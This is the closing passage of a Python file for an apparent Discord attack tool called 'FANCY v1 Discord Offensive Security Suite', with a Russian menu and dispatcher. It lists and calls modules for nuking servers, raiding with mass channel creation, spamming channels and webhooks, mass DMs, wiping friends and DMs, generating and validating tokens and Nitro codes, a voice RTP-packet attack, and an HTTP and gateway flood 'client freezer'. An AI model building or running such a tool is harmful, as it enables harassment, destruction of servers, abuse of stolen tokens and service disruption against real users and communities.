            if input(f"{W}  добавить канал? (y/n): {RS}").strip().lower() != 'y':
                break
            config["system_voice_channels"].append({"name": input(f"{W}    имя: {RS}"), "position": int(input(f"{W}    позиция: {RS}") or 0)})
    print(f"\n{Y}--- НАСТРОЙКИ ---{RS}")
    try:
        verif = int(input(f"{W}уровень верификации (0-4): {RS}") or 0)
        if not 0 <= verif <= 4:
            print(f"{R}[!] уровень верификации должен быть 0-4, установлен 0{R}")
            verif = 0
        config["verification_level"] = verif
    except ValueError:
        config["verification_level"] = 0
    try:
        cf = int(input(f"{W}фильтр контента (0-2): {RS}") or 0)
        if not 0 <= cf <= 2:
            print(f"{R}[!] фильтр контента должен быть 0-2, установлен 0{R}")
            cf = 0
        config["explicit_content_filter"] = cf
    except ValueError:
        config["explicit_content_filter"] = 0
    try:
        config["default_notifications"] = int(input(f"{W}уведомления (0-1): {RS}") or 0)
    except ValueError:
        config["default_notifications"] = 0
    while True:
        try:
            afk = int(input(f"{W}AFK таймаут (60/300/900/1800/3600): {RS}") or 300)
            if afk not in VALID_AFK_TIMEOUTS:
                print(f"{R}[!] неверный afk таймаут. допустимые: {sorted(VALID_AFK_TIMEOUTS)}{R}")
                continue
            config["afk_timeout"] = afk
            break
        except ValueError:
            config["afk_timeout"] = 300
            break
    print(f"\n{C}{'═' * 60}\n{Y}[ сводка конфигурации ]\n{C}{'═' * 60}")
    print(f"{W}название: {G}{config['name']}{RS}\n{W}регион: {G}{config['region']}{RS}\n{W}ролей: {G}{len(config['roles'])}{RS}\n{W}категорий: {G}{len(config['categories'])}{RS}")
    total_text = sum(len(cat.get("text_channels", [])) for cat in config["categories"]) + len(config["system_text_channels"])
    total_voice = sum(len(cat.get("voice_channels", [])) for cat in config["categories"]) + len(config["system_voice_channels"])
    print(f"{W}текстовых каналов: {G}{total_text}{RS}\n{W}голосовых каналов: {G}{total_voice}{RS}\n{W}уровень верификации: {G}{config['verification_level']}{RS}\n{W}фильтр контента: {G}{config['explicit_content_filter']}{RS}\n{C}{'═' * 60}")
    if input(f"\n{R}создать сервер? (y/n): {RS}").strip().lower() != 'y':
        print(f"{Y}[!] создание отменено{RS}")
        return
    print(f"\n{Y}[*] создание сервера...{RS}")
    creator = ServerCreator(token)
    guild_id = creator.build(config)
    if guild_id:
        if input(f"\n{W}создать инвайт? (y/n): {RS}").strip().lower() == 'y':
            bot_token = input(f"{W}бот токен (Enter если нет): {RS}")
            if bot_token:
                print(f"{G}инвайт (бот): {BotOperations.create_invite(bot_token, guild_id)}{RS}")
            else:
                print(f"{Y}бот токен не указан попытка создать инвайт от пользователя...{RS}")
                try:
                    channels_resp = creator._request("GET", f"guilds/{guild_id}/channels")
                    channels = channels_resp.json() if channels_resp.status_code == 200 else []
                    if channels:
                        text_channel = next((ch for ch in channels if ch.get("type") == 0), None)
                        if text_channel:
                            print(f"{G}инвайт (пользователь): {BotOperations.create_user_invite(token, guild_id, text_channel['id'])}{RS}")
                        else:
                            print(f"{R}не найден текстовый канал для инвайта{RS}")
                    else:
                        print(f"{R}не удалось получить каналы сервера{RS}")
                except Exception as e:
                    print(f"{R}ошибка создания инвайта: {e}{RS}")
    else:
        print(f"{R}[✗] ошибка создания сервера{RS}")


def start_web_interface():
    try:
        from web_server import run_web_server
    except ImportError:
        print(f"{R}[!] файл web_server.py не найден. создайте его для запуска веб-интерфейса{RS}")
        return
    print(f"{G}[+] запуск веб-интерфейса на http://127.0.0.1:28681{RS}")
    print(f"{Y}[*] открой браузер и перейди по этому адресу{RS}")
    print(f"{Y}[*] для остановки веб-интерфейса закрой терминал{RS}")
    thread = threading.Thread(target=lambda: run_web_server(port=28681), daemon=True)
    thread.start()


def clear_screen() -> None:
    os.system("cls" if os.name == "nt" else "clear")


def get_input(prompt: str) -> str:
    return input(f"{R}┌──({W}Fancy v1{R})─{R}[{W}~{R}]\n{R}└─{W}$ {RS}{prompt}")


def safe_int(prompt: str) -> int:
    while True:
        try:
            value = int(input(f"{W}{prompt}: {RS}"))
            if value <= 0:
                print(f"{R}[!] число должно быть положительным")
                continue
            return value
        except ValueError:
            print(f"{R}[!] введи нормальное число")


MODULES = {
    "1": ("Нюк токена", "удаление всех каналов и ролей на сервере"),
    "2": ("Инфо токена", "информация об аккаунте"),
    "3": ("Зайти на сервер", "вход на сервер по инвайт коду"),
    "4": ("Выйти с сервера", "выход с указанного сервера"),
    "5": ("Логин по почте", "авторизация по email и паролю"),
    "6": ("ID из токена", "декодирование токена"),
    "7": ("Рейд сервера", "создание 50 каналов"),
    "8": ("Спам в канал", "отправка множества сообщений"),
    "9": ("Удалить друзей", "удаление всех друзей"),
    "10": ("Заблокировать друзей", "блокировка всех друзей"),
    "11": ("Массовая рассылка", "отправка лс всем друзьям"),
    "12": ("Удалить лички", "удаление всех dm чатов"),
    "13": ("Смена статуса", "смена статуса"),
    "14": ("Смена языка", "смена языка интерфейса"),
    "15": ("Смена дома", "смена hypesquad дома"),
    "16": ("Смена темы", "смена темы dark light"),
    "17": ("Генератор токенов", "генерация случайного токена"),
    "18": ("Нюк ботом", "нюк сервера через бота"),
    "19": ("Инвайт бота", "создание инвайта ботом"),
    "20": ("Инфо сервера", "информация о сервере"),
    "21": ("Генератор нитро", "генерация discord gift ссылок"),
    "22": ("Инфо вебхука", "информация о вебхуке"),
    "23": ("Удалить вебхук", "удаление вебхука"),
    "24": ("Спам вебхуком", "расширенный спам с выбором режима"),
    "25": ("Генератор вебхуков", "генерация ссылки вебхука"),
    "26": ("Голосовая атака", "отправка шифрованных RTP пакетов"),
    "27": ("Фризер клиентов", "HTTP флуд и гейтвей спам"),
    "28": ("Валидатор", "проверка токенов нитро вебхуков серверов"),
    "29": ("Создать сервер", "интерактивное создание сервера с ролями и каналами"),
    "30": ("Веб-интерфейс", "запустить локальный веб-сервер с красивым дашбордом"),
}


def print_modules() -> None:
    print(f"\n{C}{'═' * 60}\n{Y}[ список функций ]\n{C}{'═' * 60}")
    for key, (name, _) in MODULES.items():
        print(f"{W}{key:>2}. {Y}{name}")
    print(f"{C}{'═' * 60}\n{W} 0. {R}выход")


def validator_menu() -> None:
    print(f"\n{C}{'═' * 60}\n{Y}[ валидатор ]\n{C}{'═' * 60}")
    print(f"{W} 1. {Y}токены\n{W} 2. {Y}нитро коды\n{W} 3. {Y}вебхуки\n{W} 4. {Y}сервера\n{W} 5. {Y}инвайты\n{W} 6. {Y}бот токены\n{W} 7. {Y}пользователи\n{W} 8. {Y}всё разом\n{C}{'═' * 60}\n{W} 0. {R}назад")
    choice = get_input("выбери тип проверки: ").strip()
    if choice == "0":
        return
    print(f"\n{C}{'═' * 60}\n{Y}[ ввод данных ]\n{C}{'═' * 60}\n{W}вводи по одному в строку пустая строка или done для завершения\n{W}введи file для загрузки из файла\n{C}{'═' * 60}")
    items: List[str] = []
    while True:
        line = input(f"{W}[{len(items)+1}] -> {RS}").strip()
        if not line or line.lower() == "done":
            break
        if line.lower() == "file":
            path = input(f"{W}путь к файлу: {RS}").strip()
            try:
                with open(path, "r", encoding="utf-8") as f:
                    loaded = [l.strip() for l in f.readlines() if l.strip()]
                print(f"{G}[+] загружено {len(loaded)} строк")
                items.extend(loaded)
            except Exception as e:
                print(f"{R}[!] ошибка чтения файла: {e}")
            continue
        items.append(line)
    if not items:
        print(f"{R}[!] нет данных для проверки")
        return
    print(f"\n{G}[+] получено {len(items)} элементов")
    dispatcher = {"1": Validator.token, "2": Validator.nitro, "3": Validator.webhook, "4": lambda x: Validator.server(x, None), "5": Validator.invite, "6": Validator.bot_token, "7": Validator.user_id}
    if choice == "8":
        valid = invalid = 0
        for item in items:
            lower = item.lower()
            result: Optional[ValidationResult] = None
            if "discord.gift/" in lower:
                result = Validator.nitro(item)
            elif "discord.com/api/webhooks" in lower:
                result = Validator.webhook(item)
            elif "discord.gg/" in lower or "discord.com/invite/" in lower:
                result = Validator.invite(item)
            elif item.startswith("Bot ") or lower.startswith("bot "):
                result = Validator.bot_token(item)
            elif "." in item and len(item) > 50 and item.count(".") >= 2:
                result = Validator.token(item)
            elif item.isdigit() and 17 <= len(item) <= 19:
                result = Validator.smart_id(item, None)
            else:
                result = ValidationResult(False, "неизвестно", "не удалось определить тип", 0)
            if result and result.valid:
                valid += 1
                print(f"{G}[✓] {result.type}: {result.info}")
            else:
                invalid += 1
                print(f"{R}[✗] {result.type}: {result.info if result else 'нет результата'}")
        print(f"\n{C}{'═' * 60}\n{G}валидных: {valid} | {R}невалидных: {invalid}\n{C}{'═' * 60}")
        return
    if choice in dispatcher:
        func = dispatcher[choice]
        valid = invalid = 0
        print(f"\n{C}{'═' * 60}\n{Y}[+] проверка {len(items)} элементов...\n{C}{'═' * 60}")
        for item in items:
            result = func(item)
            if result.valid:
                valid += 1
                print(f"{G}[✓] {result.type}: {result.info} (статус: {result.status_code})")
            else:
                invalid += 1
                print(f"{R}[✗] {result.type}: {result.info} (статус: {result.status_code})")
        print(f"\n{C}{'═' * 60}\n{G}валидных: {valid} | {R}невалидных: {invalid}\n{C}{'═' * 60}")
        return
    else:
        print(f"{R}[!] неверный выбор")


def main() -> None:
    token_ops = TokenOperations()
    while True:
        clear_screen()
        print(f"""
{R}╔══════════════════════════════════════════════════════════════════╗
{R}║{W}  ███████╗ █████╗ ███╗   ██╗ ██████╗██╗   ██╗    ██╗   ██╗ ██╗{R}║
{R}║{W}  ██╔════╝██╔══██╗████╗  ██║██╔════╝╚██╗ ██╔╝    ██║   ██║███║{R}║
{R}║{W}  █████╗  ███████║██╔██╗ ██║██║      ╚████╔╝     ██║   ██║╚██║{R}║
{R}║{W}  ██╔══╝  ██╔══██║██║╚██╗██║██║       ╚██╔╝      ╚██╗ ██╔╝ ██║{R}║
{R}║{W}  ██║     ██║  ██║██║ ╚████║╚██████╗   ██║        ╚████╔╝  ██║{R}║
{R}║{W}  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝   ╚═╝         ╚═══╝   ╚═╝{R}║
{R}║                                                              ║
{R}║{W}                  FANCY v1                                  {R}║
{R}║{W}        {C}Discord Offensive Security Suite{W}                      {R}║
{R}╚══════════════════════════════════════════════════════════════════╝
""")
        print(f"{R}┌──────────────────────────────────────────────────────────────────┐\n{R}│{W}  выбери функцию по номеру                                   {R}│\n{R}└──────────────────────────────────────────────────────────────────┘")
        print_modules()
        choice = get_input("выбери опцию: ").strip()
        if choice == "0":
            print(f"{G}[+] пока братан")
            sys.exit(0)
        if choice not in MODULES:
            print(f"{R}[!] нет такой опции")
            time.sleep(1.5)
            continue
        name, desc = MODULES[choice]
        print(f"\n{C}{'═' * 60}\n{Y}[ {name} ]\n{C}{'═' * 60}\n{W}{desc}\n{C}{'═' * 60}")
        if input(f"{G}[?] начать? (y/n) -> {RS}").strip().lower() not in ("y", "yes", "да", "1"):
            print(f"{Y}[!] отмена")
            time.sleep(1)
            continue
        if choice == "28":
            try:
                validator_menu()
            except KeyboardInterrupt:
                print(f"\n{Y}[!] отмена")
                time.sleep(0.5)
            continue
        if choice == "29":
            try:
                server_creator_menu()
            except KeyboardInterrupt:
                print(f"\n{Y}[!] отмена")
                time.sleep(0.5)
            continue
        if choice == "30":
            start_web_interface()
            continue
        try:
            if choice == "1":
                token = input("токен: ")
                token_ops.set_token(token)
                print(token_ops.nuke_guild(input("айди сервера: ")))
            elif choice == "2":
                token = input("токен: ")
                token_ops.set_token(token)
                print(token_ops.get_info())
            elif choice == "3":
                token = input("токен: ")
                token_ops.set_token(token)
                print(token_ops.join_invite(input("код инвайта: ")))
            elif choice == "4":
                token = input("токен: ")
                token_ops.set_token(token)
                print(token_ops.leave_guild(input("айди сервера: ")))
            elif choice == "5":
                print(token_ops.login(input("почта: "), getpass.getpass("пароль: "), input("капча (опционально): ") or None))
            elif choice == "6":
                token = input("токен: ")
                token_ops.set_token(token)
                print(token_ops.decode_token())
            elif choice == "7":
                token = input("токен: ")
                token_ops.set_token(token)
                print(token_ops.raid_server(input("айди сервера: ")))
            elif choice == "8":
                token = input("токен: ")
                token_ops.set_token(token)
                try:
                    count = int(input("количество (по умолч 100): ") or "100")
                except ValueError:
                    count = 100
                print(token_ops.spam_channel(input("айди канала: "), input("сообщение: "), count))
            elif choice == "9":
                token = input("токен: ")
                token_ops.set_token(token)
                print(token_ops.delete_friends())
            elif choice == "10":
                token = input("токен: ")
                token_ops.set_token(token)
                print(token_ops.block_friends())
            elif choice == "11":
                token = input("токен: ")
                token_ops.set_token(token)
                print(token_ops.mass_dm(input("сообщение: ")))
            elif choice == "12":
                token = input("токен: ")
                token_ops.set_token(token)
                print(token_ops.delete_dms())
            elif choice == "13":
                token = input("токен: ")
                token_ops.set_token(token)
                print(token_ops.set_status(input("статус (online/idle/dnd/invisible): "), input("текст (опционально): ") or None))
            elif choice == "14":
                token = input("токен: ")
                token_ops.set_token(token)
                print(token_ops.set_language(input("язык (ru/en/ja/ko): ")))
            elif choice == "15":
                token = input("токен: ")
                token_ops.set_token(token)
                print(token_ops.set_house(input("дом (brilliance/bravery/balance): ")))
            elif choice == "16":
                token = input("токен: ")
                token_ops.set_token(token)
                print(token_ops.set_theme(input("тема (dark/light): ")))
            elif choice == "17":
                print(f"токен: {TokenOperations.generate_token()}")
            elif choice == "18":
                print(BotOperations.nuke_guild(input("бот токен: "), input("айди сервера: ")))
            elif choice == "19":
                print(BotOperations.create_invite(input("бот токен: "), input("айди сервера: ")))
            elif choice == "20":
                print(ServerOperations.get_info(input("токен: "), input("айди сервера: ")))
            elif choice == "21":
                print(NitroOperations.generate())
            elif choice == "22":
                print(WebhookOperations.get_info(input("вебхук ссылка: ")))
            elif choice == "23":
                print(WebhookOperations.delete(input("вебхук ссылка: ")))
            elif choice == "24":
                webhook_spam_menu()
            elif choice == "25":
                print(f"вебхук: {WebhookOperations.generate()}")
            elif choice == "26":
                token = input("токен: ")
                guild = safe_int("айди сервера")
                channel = safe_int("айди голосового канала")
                kicker = VoiceKicker(token)
                try:
                    asyncio.run(kicker.execute(guild, channel))
                except KeyboardInterrupt:
                    print(f"\n{Y}[!] атака прервана")
                    try:
                        asyncio.run(kicker._leave_voice(str(guild)))
                    except KeyboardInterrupt:
                        pass
            elif choice == "27":
                token = input("токен: ")
                guild = safe_int("айди сервера")
                channel = safe_int("айди голосового канала")
                freezer = ClientFreezer(token)
                try:
                    asyncio.run(freezer.execute(guild, channel))
                except KeyboardInterrupt:
                    print(f"\n{Y}[!] атака прервана")
        except KeyboardInterrupt:
            print(f"\n{Y}[!] операция прервана")
        except Exception as e:
            print(f"{R}[!] ошибка: {e}")
        input(f"\n{W}enter для продолжения...{RS}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}[+] пока")
        sys.exit(0)
    except Exception as e:
        print(f"{R}[!] критическая ошибка: {e}")
        logger.exception("критическая ошибка")
        sys.exit(1)